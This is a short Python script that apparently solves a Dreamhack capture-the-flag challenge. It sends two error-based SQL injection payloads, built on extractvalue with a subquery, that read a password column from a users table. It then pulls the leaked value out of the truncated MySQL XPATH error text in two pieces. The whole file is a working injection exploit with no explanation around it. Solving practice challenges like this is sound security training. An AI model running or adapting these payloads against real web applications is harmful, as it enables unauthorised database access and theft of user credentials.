import requests

URL = "http://host1.dreamhack.games:24197/"
PAYLOAD01 = "/?uid=test%27%20AND%20extractvalue(rand(),concat(0x3a,(SELECT%20concat(0x3a,upw)%20FROM%20users.user%20LIMIT%200,1)))--%20-"
PAYLOAD02 = "/?uid=test%27%20AND%20extractvalue(rand(),concat(0x3a,(SELECT%20concat(0x3a,substr(upw,28,length(upw)))%20FROM%20users.user%20LIMIT%200,1)))--%20-"
START_STR = '''(1105, "XPATH syntax error: '::'''
END_STR01 = '''...'")'''
END_STR02 = ''''")'''
FLAG = ""

resp = requests.get(URL + PAYLOAD01)
LEN01 = len(START_STR)
LEN02 = resp.text.find(END_STR01)
FLAG += resp.text[LEN01:LEN02]

resp = requests.get(URL + PAYLOAD02)
LEN02 = resp.text.find(END_STR02)
FLAG += resp.text[LEN01:LEN02]

print(FLAG)